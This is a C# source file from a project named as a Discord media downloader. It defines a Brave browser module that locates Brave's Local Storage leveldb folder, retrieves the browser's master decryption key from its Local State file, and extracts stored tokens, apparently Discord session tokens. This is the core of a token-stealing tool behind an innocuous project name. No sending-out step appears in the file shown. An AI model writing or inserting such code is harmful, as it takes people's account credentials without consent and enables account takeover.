using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;

using Discord_Media_DL.Misc;

namespace Discord_Media_DL.Token.Apps
{
    class Brave : IApp
    {
        public string Name => "Brave";

        public string[] TokenPaths => new string[]
        {
            Help.Paths.AppDataLocal + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb\",
        };

        public async Task<string[]> GetTokens()
        {
            List<string> result = new();

            var LocalStatePath = Path.Combine(Help.Paths.AppDataLocal, @"BraveSoftware\Brave-Browser\User Data\", "Local State");
            var masterKeyBytes = ChromeSecurity.GetMasterKey(LocalStatePath);

            ParallelLoopResult loop = Parallel.ForEach(TokenPaths, (tokenPath) =>
            {
                result.AddRange(TokensUtil.GetTokensFromPath(tokenPath, masterKeyBytes));
            });

            while (loop.IsCompleted == false)
                await Task.Delay(100);

            return result.ToArray();
        }
    }
}
